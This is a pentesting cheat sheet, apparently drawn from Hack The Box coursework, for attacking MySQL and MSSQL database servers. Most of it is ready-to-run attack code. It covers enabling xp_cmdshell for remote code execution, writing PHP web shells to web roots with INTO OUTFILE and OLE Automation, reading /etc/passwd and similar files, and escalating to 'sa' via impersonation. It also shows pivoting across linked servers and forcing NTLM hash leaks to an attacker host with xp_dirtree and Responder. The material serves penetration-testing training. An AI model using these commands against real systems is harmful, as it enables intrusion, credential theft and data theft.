# 🗄️ SQL (MySQL & MSSQL) Attack Cheat Sheet

> [!info] 🧠 What is SQL?
> 
> Bash
> 
> ```
> Relational Database Management Systems (RDBMS) that store data in structured tables, columns, and rows.
> ```
> 
> 💡 Allows administrators to:
> 
> - Handle structural data storage, user permissions, and application record management.
>     
> - Run extended system stored procedures and interact with host operating systems.
>     
> - Configure linked data instances across distinct network segments.
>     
> 
> ✔ Common Ports:
> 
> - **1433/tcp** → Microsoft SQL Server (MSSQL) Default Standard Port.
>     
> - **2433/tcp** → MSSQL Hidden Mode Configuration instance.
>     
> - **3306/tcp** → MySQL Default Port.
>     

> [!tip] 🔧 Core Idea
> 
> Bash
> 
> ```
> Authenticated Connection Handle ↔ Database Metadata, Schemas, & Underlying Host OS Context
> ```
> 
> ✔ Think of it as **high-value data vaults that regularly execute commands with elevated system process permissions**

# 🎯 Quick Enumeration Workflow

Plaintext

```
Database Port Open (1433 / 3306)
          │
          ▼
   Banner Grabbing (Identify Software & Build Version)
          │
          ▼
   Determine Auth Environment (Windows vs. Mixed vs. Standard)
          │
          ▼
   Credential Brute-force / Default Passwords Test
          │
          ▼
   Identify System & User Database Tables (Dump Hashes & PII)
          │
          ▼
   Analyze Permissions Context (Check for 'sa' / Sysadmin Rights)
          │
          ▼
   Privilege Escalation Loop (Exploit Context Impersonation / 'IMPERSONATE')
          │
          ▼
   Post-Exploitation Execution (xp_cmdshell / Outfile backdoors / linked servers)
```

# 📚 Default System Databases

|**Database Engine**|**System Database**|**Operational Pentesting Purpose**|
|---|---|---|
|**MySQL**|`information_schema`|Global metadata index tracking all databases, custom tables, and columns.|
|**MySQL**|`mysql`|Core administrative engine storing database usernames and password hashes.|
|**MSSQL**|`master`|Primary instance schema tracking all databases, logins, and settings.|
|**MSSQL**|`msdb`|Back-end database engine utilized heavily by the automated SQL Server Agent.|

# 🔍 Initial Enumeration

### 📡 Network Footprinting (Nmap)

Bash

```
# Automated fingerprinting script and version tracking scan
sudo nmap -sC -sV -p 1433,3306 <IP>
```

### 🔓 Interactive Database Client Connections

Bash

```
# 1. Connect to MySQL Target instance
mysql -u root -pPassword123 -h <IP>

# 2. Connect to MSSQL Target instance via Linux (Disabling headers)
sqsh -S <IP> -U sa -P 'MyPassword!' -h

# 3. Connect to MSSQL Target via Linux forcing Windows Domain Auth
sqsh -S <IP> -U .\\administrator -P 'MyPassword!' -h

# 4. Connect to MSSQL Target instance via Windows Command Prompt
sqlcmd -S <IP> -U sa -P 'MyPassword!' -y 30 -Y 30

# 5. Alternative Impacket Python interactive terminal
mssqlclient.py -p 1433 sa@<IP>
```

# 🌳 SQL Data Mining Reference Syntax

|**Operation Task**|**MySQL Engine**|**MSSQL Engine (Requires GO)**|
|---|---|---|
|**Enumerate Databases**|`SHOW DATABASES;`|`SELECT name FROM master.dbo.sysdatabases;`|
|**Select Active Profile**|`USE htbusers;`|`USE htbusers;`|
|**Enumerate Tables**|`SHOW TABLES;`|`SELECT table_name FROM INFORMATION_SCHEMA.TABLES;`|
|**Pillage Data Sets**|`SELECT * FROM users;`|`SELECT * FROM users;`|

# 🔥 Remote Code Execution (RCE)

### [MSSQL Execution via `xp_cmdshell`]

> 📌 **PRECISION NOTE:** Code execution commands run natively under the operating system permission structure held by the underlying database service account.

SQL

```
-- Step 1: Force active command processing context if locked out
EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;
GO

-- Step 2: Trigger targeted operating system execution strings
xp_cmdshell 'whoami';
GO
```

### [MySQL Web Backdoor Deployment]

SQL

```
-- Compile a functional web shell payload directly into an accessible web directory root
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

💡 **System Pre-requisite:** Global tracking context `secure_file_priv` must remain empty (`""`), and the executing user must hold explicit `FILE` privileges.

### [MSSQL File Injection via OLE Automation]

SQL

```
-- Enable automated storage creation features
sp_configure 'show advanced options', 1; RECONFIGURE;
sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
GO

-- Allocate a transient scripting workspace to write text directly to disk
DECLARE @OLE INT; DECLARE @FileID INT;
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT;
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1;
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>';
EXECUTE sp_OADestroy @FileID; EXECUTE sp_OADestroy @OLE;
GO
```

# 📥 Arbitrary File Read Operations

### [MSSQL Internal Bulk Selection File Read]

SQL

```
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents;
GO
```

### [MySQL Native Loading File Read]

SQL

```
SELECT LOAD_FILE("/etc/passwd");
```

# 🎭 Privilege Escalation & Lateral Movement

### [MSSQL Token Context Impersonation]

SQL

```
-- 1. Scan for explicitly granted IMPERSONATE identities
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
GO

-- 2. Shift context identity over to 'sa' (Sysadmin Escalation)
USE master;
EXECUTE AS LOGIN = 'sa';
SELECT IS_SRVROLEMEMBER('sysadmin'); -- Returns '1' (Success)
GO

-- 3. Release high-privilege context and return to original login state
REVERT;
GO
```

### [MSSQL Linked Server Pivoting]

SQL

```
-- 1. Identify established database link profiles (isremote = 0 flags a linked server connection)
SELECT srvname, isremote FROM sysservers;
GO

-- 2. Issue pass-through execution requests across the network link mapping
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS];
GO
```

# 📡 Active Directory Service Hash Stealing

> [!danger] 🔓 Forced SMB Authentication Attacks via MSSQL
> 
> Undocumented directory enumeration stored procedures (`xp_dirtree` / `xp_subdirs`) accept UNC formatting targets. Providing an attacker-controlled listener location forces the Windows host engine running the SQL Server service account to initiate automated network authentication via SMB.

SQL

```
-- Trigger outbound NTLM authentication token drop via xp_dirtree
EXEC master..xp_dirtree '\\<KALI_IP>\share\'

-- Trigger outbound NTLM authentication token drop via xp_subdirs
EXEC master..xp_subdirs '\\<KALI_IP>\share\'
GO
```

### [Hash Ingestion Tooling Configurations]

Bash

```
# Method A: Initialize a local network responder script to capture the incoming NetNTLMv2 string
sudo responder -I tun0

# Method B: Initialize an Impacket server tab to store the inbound authentication blob
sudo impacket-smbserver share ./ -smb2support
```

# 🧩 Mental Model

🎯 **Database Attack Vectors**

Plaintext

```
Database Port Responsive
 ├─ Credentials Available?
 │   ├─ Connect via sqsh / mysql
 │   ├─ Check DB Roles: IS_SRVROLEMEMBER('sysadmin')
 │   │   ├─ True  --> xp_cmdshell --> Elevated Host RCE
 │   │   └─ False --> Check IMPERSONATE Rights --> Pivot to 'sa' Context
 │   │
 │   └─ Look for Linked Connections (sysservers) --> Move Laterally across Subnets
 │
 └─ Stuck on Low-Privilege / Uncracked Context?
     └─ Execute xp_dirtree --> Force SMB UNC Authentication Drop --> Capture Service Hash
```

💡 **SQL Rule of Thumb:** Never limit your assessment to database tables. If you gain administrative access (`sa`/`root`), immediately check file system parameters or execute system commands to transition your context into an operating system platform shell!